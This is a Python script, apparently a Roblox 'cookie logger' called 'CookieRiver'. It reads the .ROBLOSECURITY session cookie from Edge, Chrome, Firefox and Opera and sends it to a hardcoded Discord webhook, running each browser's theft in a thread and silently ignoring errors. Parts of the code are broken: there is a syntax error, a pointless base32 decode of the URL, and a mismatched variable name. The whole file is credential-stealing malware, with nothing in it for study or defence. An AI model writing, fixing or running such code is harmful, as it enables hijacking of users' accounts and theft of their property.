import browser_cookie3, requests, threading
import base64
import time
import os
from discord_webhook import DiscordWebhook, DiscordEmbed





key = "https://discord.com/api/webhooks/1134260436779409418/_kgdI39vhDW3kNqFkjHkN7D9mWadwzN9z4FbJ2ARbriw-BpgJdpulsot_Nw04MePGwOn"

weblook = base64.b32decode(key)
webhookl = DiscordWebhook(url=weblook, , username="CookieRiver")
def edge_logger():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass

def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass

def firefox_logger():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass

def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass

browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]

for x in browsers:
    threading.Thread(target=x,).start()
